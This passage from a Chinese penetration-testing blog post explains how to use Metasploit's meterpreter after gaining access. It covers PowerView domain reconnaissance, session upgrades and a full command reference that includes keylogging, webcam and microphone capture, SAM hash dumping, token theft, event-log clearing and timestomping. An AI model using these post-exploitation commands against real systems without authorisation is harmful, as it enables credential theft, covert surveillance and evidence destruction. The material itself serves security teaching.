+<h2 id="导入并执行PowerShell脚本"><a href="#导入并执行PowerShell脚本" class="headerlink" title="导入并执行PowerShell脚本"></a>导入并执行PowerShell脚本</h2><p>如果powershell脚本是用于域内信息收集的，则获取到的权限用户需要是域用户</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">load powershell            <span class="token comment">#加载powershell功能</span>
+powershell_import <span class="token operator">/</span>root<span class="token operator">/</span>PowerView<span class="token punctuation">.</span>ps1      <span class="token comment">#导入powershell脚本，提前将该powershell脚本放到指定目录</span>
+powershell_execute Get<span class="token operator">-</span>NetDomain     <span class="token comment">#执行该脚本下的功能模块Get-domain，该模块用于获取域信息，一个脚本下通常有多个功能模块</span>
+powershell_execute Invoke<span class="token operator">-</span>UserHunter  <span class="token comment">#该功能模块用于定位域管理员登录的主机</span>
+powershell_execute Get<span class="token operator">-</span>NetForest      <span class="token comment">#该模块用于定位域信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078800868-874350d3-4894-47ab-b74c-fc5c25b8e3ab.png" alt="img"></p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078802726-c92d83cc-0e53-4ab5-877d-0c6ad6556086.png" alt="img"></p>
+<h2 id="加载stdapi"><a href="#加载stdapi" class="headerlink" title="加载stdapi"></a>加载stdapi</h2><p>有时候虽然我们获取到了meterpreter，但是执行一些命令会显示没有该命令，这时我们可以执行：load stdapi来加载，这样我们就可以执行命令了。</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078803492-948f9090-8eb6-4149-8bad-4783e074b4ae.png" alt="img"></p>
+<h2 id="升级Session"><a href="#升级Session" class="headerlink" title="升级Session"></a>升级Session</h2><p>有时候，当我们收到的不是 meterpreter 类型的 session 的话，可能不好操作。我们可以执行命令 <strong>sessions -u id</strong> 来升级session。执行该命令，默认调用的是 <strong>post&#x2F;multi&#x2F;manage&#x2F;shell_to_meterpreter</strong> 模块。</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078803415-65d69c81-02ba-4cbc-9309-7ed49fdb9b6f.png" alt="img"></p>
+<h2 id="Meterpreter的更多用法"><a href="#Meterpreter的更多用法" class="headerlink" title="Meterpreter的更多用法"></a>Meterpreter的更多用法</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">Core Commands   核心命令
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+Command                   Description
+<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>                   <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
+  ?                            Help menu
+  background         Backgrounds the current session
+bgkill                     Kills a background meterpreter script
+bglist                     Lists running background scripts
+bgrun                      Executes a meterpreter script <span class="token keyword">as</span> a background thread
+channel                   Displays information <span class="token keyword">or</span> control active channels
+close                      Closes a channel
+disable_unicode_encoding   Disables encoding of <span class="token builtin">unicode</span> strings
+enable_unicode_encoding   Enables encoding of <span class="token builtin">unicode</span> strings
+  exit                         Terminate the meterpreter session
+get_timeouts              Get the current session timeout values
+  <span class="token builtin">help</span>                       Help menu
+   info                        Displays information about a Post module
+irb                          Drop into irb scripting mode
+load                       Load one <span class="token keyword">or</span> more meterpreter extensions
+machine_id                Get the MSF ID of the machine attached to the session
+migrate                   Migrate the server to another process
+    quit                      Terminate the meterpreter session
+read                      Reads data <span class="token keyword">from</span> a channel
+resource                  Run the commands stored <span class="token keyword">in</span> a <span class="token builtin">file</span>
+run                       Executes a meterpreter script <span class="token keyword">or</span> Post module
+set_timeouts              Set the current session timeout values
+sleep                     Force Meterpreter to go quiet<span class="token punctuation">,</span> then re<span class="token operator">-</span>establish session<span class="token punctuation">.</span>
+transport                 Change the current transport mechanism
+use                       Deprecated alias <span class="token keyword">for</span> <span class="token string">'load'</span>
+uuid                      Get the UUID <span class="token keyword">for</span> the current session
+write                     Writes data to a channel
+
+Stdapi<span class="token punctuation">:</span> File system Commands 文件系统命令
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+
+Command       Description
+<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>       <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
+cat           Read the contents of a <span class="token builtin">file</span> to the screen
+cd            Change directory
+<span class="token builtin">dir</span>           List files <span class="token punctuation">(</span>alias <span class="token keyword">for</span> ls<span class="token punctuation">)</span>
+  download      Download a <span class="token builtin">file</span> <span class="token keyword">or</span> directory
+edit          Edit a <span class="token builtin">file</span>
+getlwd        Print local working directory
+getwd         Print working directory
+lcd           Change local working directory
+lpwd          Print local working directory
+    ls            List files
+mkdir         Make directory
+mv            Move source to destination
+pwd           Print working directory
+rm            Delete the specified <span class="token builtin">file</span>
+rmdir         Remove directory
+search        Search <span class="token keyword">for</span> files
+show_mount    List <span class="token builtin">all</span> mount points<span class="token operator">/</span>logical drives
+    upload        Upload a <span class="token builtin">file</span> <span class="token keyword">or</span> directory
+
+Stdapi<span class="token punctuation">:</span> Networking Commands 网络命令
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+Command       Description
+<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>       <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
+arp                Display the host ARP cache
+getproxy       Display the current proxy configuration
+    ifconfig        Display interfaces
+ipconfig      Display interfaces
+    netstat       Display the network connections
+portfwd        Forward a local port to a remote service
+route          View <span class="token keyword">and</span> modify the routing table
+
+Stdapi<span class="token punctuation">:</span> System Commands 系统命令
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+Command       Description
+<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>       <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
+clearev       Clear the event log
+drop_token    Relinquishes <span class="token builtin">any</span> active impersonation token<span class="token punctuation">.</span>
+execute       Execute a command
+getenv        Get one <span class="token keyword">or</span> more environment variable values
+getpid        Get the current process identifier
+getprivs      Attempt to enable <span class="token builtin">all</span> privileges available to the current process
+getsid        Get the SID of the user that the server <span class="token keyword">is</span> running <span class="token keyword">as</span>
+  getuid        Get the user that the server <span class="token keyword">is</span> running <span class="token keyword">as</span>
+ kill          Terminate a process
+ ps            List running processes
+reboot        Reboots the remote computer
+reg           Modify <span class="token keyword">and</span> interact <span class="token keyword">with</span> the remote registry
+rev2self      Calls RevertToSelf<span class="token punctuation">(</span><span class="token punctuation">)</span> on the remote machine
+    shell         Drop into a system command shell
+    shutdown      Shuts down the remote computer
+steal_token   Attempts to steal an impersonation token <span class="token keyword">from</span> the target process
+suspend       Suspends <span class="token keyword">or</span> resumes a <span class="token builtin">list</span> of processes
+  sysinfo       Gets information about the remote system<span class="token punctuation">,</span> such <span class="token keyword">as</span> OS
+
+Stdapi<span class="token punctuation">:</span> User interface Commands 用户界面命令
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+Command        Description
+<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>        <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
+enumdesktops       List <span class="token builtin">all</span> accessible desktops <span class="token keyword">and</span> window stations
+getdesktop             Get the current meterpreter desktop
+idletime                    Returns the number of seconds the remote user has been idle
+keyscan_dump       Dump the keystroke <span class="token builtin">buffer</span>
+keyscan_start        Start capturing keystrokes
+keyscan_stop        Stop capturing keystrokes
+    screenshot           Grab a screenshot of the interactive desktop
+setdesktop              Change the meterpreters current desktop
+    uictl                       Control some of the user interface components
+
+Stdapi<span class="token punctuation">:</span> Webcam Commands 摄像头命令
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+Command        Description
+<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>        <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
+record_mic           Record audio <span class="token keyword">from</span> the default microphone <span class="token keyword">for</span> X seconds
+webcam_chat       Start a video chat
+   webcam_list       List webcams
+  webcam_snap    Take a snapshot <span class="token keyword">from</span> the specified webcam
+webcam_stream   Play a video stream <span class="token keyword">from</span> the specified webcam
+
+Priv<span class="token punctuation">:</span> Elevate Commands 提权命令
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+Command       Description
+<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>       <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
+    getsystem     Attempt to elevate your privilege to that of local system<span class="token punctuation">.</span>
+
+Priv<span class="token punctuation">:</span> Password database Commands 密码
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+Command       Description
+<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>       <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
+    hashdump      Dumps the contents of the SAM database
+
+Priv<span class="token punctuation">:</span> Timestomp Commands 时间戳命令
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+Command       Description
+<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>       <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
+    timestomp     Manipulate <span class="token builtin">file</span> MACE attributes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>相关文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/83869141">Msfvenonm生成一个后门木马</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/89489609">渗透测试神器Cobalt Strike的使用</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/xie1997.github.io/about" rel="external nofollow noreferrer">谢公子</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://xie1997.github.io/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/">https://xie1997.github.io/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/xie1997.github.io/about" target="_blank">谢公子</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/xie1997.github.io/tags/%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/">
+                                    <span class="chip bg-color">工具的使用</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/xie1997.github.io/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/xie1997.github.io/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/xie1997.github.io/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/xie1997.github.io/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/xie1997.github.io/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/">
+                    <div class="card-image">
+                        
+                        <img src="https://pic.imgdb.cn/item/63e267914757feff33d0a72b.jpg" class="responsive-img" alt="CobaltStrike的使用">
+                        
+                        <span class="card-title">CobaltStrike的使用</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            介绍CobaltStrike的使用
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2019-12-19
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/xie1997.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/" class="post-category">
+                                    技术文章
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/xie1997.github.io/tags/%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/">
+                        <span class="chip bg-color">工具的使用</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                本篇&nbsp;<i class="far fa-dot-circle"></i>
+            </div>
+            <div class="card">
+                <a href="/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/">
+                    <div class="card-image">
+                        
+                        <img src="https://pic.imgdb.cn/item/63e268444757feff33d2687b.jpg" class="responsive-img" alt="Metasploit Framework(MSF)的使用">
+                        
+                        <span class="card-title">Metasploit Framework(MSF)的使用</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            介绍MSF的使用
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-03-01
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/xie1997.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/" class="post-category">
+                                    技术文章
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/xie1997.github.io/tags/%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/">
+                        <span class="chip bg-color">工具的使用</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: 谢公子的小黑屋<br />'
+            + '文章作者: 谢公子<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者谢公子所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/xie1997.github.io/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/xie1997.github.io/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/xie1997.github.io/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/xie1997.github.io/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/xie1997.github.io/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('7'),
+            headingSelector: 'h1, h2, h3, h4, h5, h6, h7'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2023</span>
+            
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">谢公子</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">50.3k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+                <span id="sitetime"> Loading ...</span>
+                <script>
+                    var calcSiteTime = function () {
+                        var seconds = 1000;
+                        var minutes = seconds * 60;
+                        var hours = minutes * 60;
+                        var days = hours * 24;
+                        var years = days * 365;
+                        var today = new Date();
+                        var startYear = "2019";
+                        var startMonth = "1";
+                        var startDate = "2";
+                        var startHour = "0";
+                        var startMinute = "0";
+                        var startSecond = "0";
+                        var todayYear = today.getFullYear();
+                        var todayMonth = today.getMonth() + 1;
+                        var todayDate = today.getDate();
+                        var todayHour = today.getHours();
+                        var todayMinute = today.getMinutes();
+                        var todaySecond = today.getSeconds();
